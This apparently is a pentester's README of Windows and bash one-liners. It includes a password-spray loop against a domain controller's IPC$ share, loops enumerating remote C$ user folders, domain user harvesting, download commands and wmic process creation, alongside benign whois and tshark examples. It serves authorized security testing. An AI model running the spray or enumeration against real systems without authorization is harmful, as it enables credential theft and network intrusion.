# oneliners
One line DOS commands useful during pentests

Get-ChildItem -Recurse | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-180)}   #returns files modified in past 180 days

for /f %a in (hosts.txt) do dir /b /s \\\\%a\\C$\\Users\\file*

for /f %a in (hosts.txt) do @if exist \\\\%a\\C$\\Users\\ echo users found on %a

Build a user list, but will need to edit the output before using
for /f "skip=2 tokens=1,2,3" %i in ('net user /domain') do @echo %i >>testuser.txt & @echo %j >>testuser.txt & @echo %k >>testuser.txt

password spray
@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\DOMAINCONTROLLER\IPC$ > NUL 

invoke-webrequest -uri url -outfile filename
(New-Object System.Net.WebClient).DownloadFile("url","output")

wmic process call create "cmd.exe /c calc.exe"

(Bash) for i in (cat filename); do echo $i; done

With GDPR there is different information available between variosu registrars.  This whois query will query the specific registrar and return results direct from the registrar:
whois -h $(whois apple.com | grep 'WHOIS Server' | cut -d: -f 2) apple.com
or look up a few like this:
for i in sans.org theonion.com; do whois -h $(whois $i | grep 'WHOIS Server' | cut -d: -f 2) $i; done

This is more for the powershell stuff at the end of the line:

tshark -r e:\capture\random.pcap -Y http.user_agent -T fields -e http.user_agent | powershell -nop "$input | group-object | Select-Object -Property Count, Name | Sort-Object -Property Count -Descending "

tshark -r e:\capture\random.pcap -Y http.user_agent -T fields -e http.user_agent | powershell -nop "$input | group | select Count, Name | sort Count -d"

tshark -r e:\capture\m2.pcap -Y http.user_agent -T fields -e http.user_agent | powershell -nop "$input | group | select Count, Name | sort Count -d"










